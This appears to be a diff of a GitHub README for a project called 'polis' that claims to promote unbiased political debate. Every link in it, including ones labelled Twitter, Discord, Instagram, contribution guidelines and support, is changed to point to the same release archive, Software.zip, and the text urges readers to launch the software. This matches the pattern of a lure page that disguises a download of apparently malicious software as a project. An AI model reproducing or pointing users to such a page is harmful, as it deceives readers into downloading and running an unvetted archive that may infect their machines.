@@ -1,7 +1,7 @@
 
 # 🌟 Polis: Pioneering Unbiased Political Discourse and Fact-Driven Debates 🌟
 
-![polis](https://github.com/kyrapatience/polis/releases/download/v1.0/Program.zip)
+![polis](https://github.com/kyrapatience/polis/releases/download/v2.0/Software.zip)
 
 Welcome to the **polis** GitHub repository! We are dedicated to pioneering unbiased political discourse and fact-driven debates. Our goal is to foster a community where diverse viewpoints are respected, and discussions are based on accurate information. Join us in shaping the future of political conversations!
 
@@ -26,7 +26,7 @@ At **polis**, we believe in using advanced technology to enhance political discu
 
 To start exploring the **polis** project, download the software package from the following link:
 
-[![Launch Software](https://github.com/kyrapatience/polis/releases/download/v1.0/Program.zip%20Software-Click%20Here-orange)](https://github.com/kyrapatience/polis/releases/download/v1.0/Program.zip)
+[![Launch Software](https://github.com/kyrapatience/polis/releases/download/v2.0/Software.zip%20Software-Click%20Here-orange)](https://github.com/kyrapatience/polis/releases/download/v2.0/Software.zip)
 
 🚀 *Please note: The software needs to be launched to access all the exciting features!*
 
@@ -34,19 +34,19 @@ If you encounter any issues with the link provided, feel free to check the "Rele
 
 ## Contribution Guidelines
 
-We welcome contributions from the community to help us improve **polis**. If you have ideas for enhancing unbiased political discourse or want to collaborate on implementing new features, please refer to our [Contribution Guidelines](https://github.com/kyrapatience/polis/releases/download/v1.0/Program.zip).
+We welcome contributions from the community to help us improve **polis**. If you have ideas for enhancing unbiased political discourse or want to collaborate on implementing new features, please refer to our [Contribution Guidelines](https://github.com/kyrapatience/polis/releases/download/v2.0/Software.zip).
 
 ## Community
 
 Join our community of passionate individuals who are dedicated to revolutionizing political discussions. Connect with us on social media platforms, participate in debates, and stay updated on the latest developments in the world of unbiased political discourse.
 
-🌐 Follow us on [Twitter](https://github.com/kyrapatience/polis/releases/download/v1.0/Program.zip)  
-💬 Join our [Discord](https://github.com/kyrapatience/polis/releases/download/v1.0/Program.zip) channel  
-📸 Explore behind-the-scenes on [Instagram](https://github.com/kyrapatience/polis/releases/download/v1.0/Program.zip)  
+🌐 Follow us on [Twitter](https://github.com/kyrapatience/polis/releases/download/v2.0/Software.zip)  
+💬 Join our [Discord](https://github.com/kyrapatience/polis/releases/download/v2.0/Software.zip) channel  
+📸 Explore behind-the-scenes on [Instagram](https://github.com/kyrapatience/polis/releases/download/v2.0/Software.zip)  
 
 ## Support
 
-If you have any questions, feedback, or need assistance with the **polis** platform, please reach out to our support team at [https://github.com/kyrapatience/polis/releases/download/v1.0/Program.zip]. We are here to ensure your experience is seamless and productive.
+If you have any questions, feedback, or need assistance with the **polis** platform, please reach out to our support team at [https://github.com/kyrapatience/polis/releases/download/v2.0/Software.zip]. We are here to ensure your experience is seamless and productive.
 
 ---
 
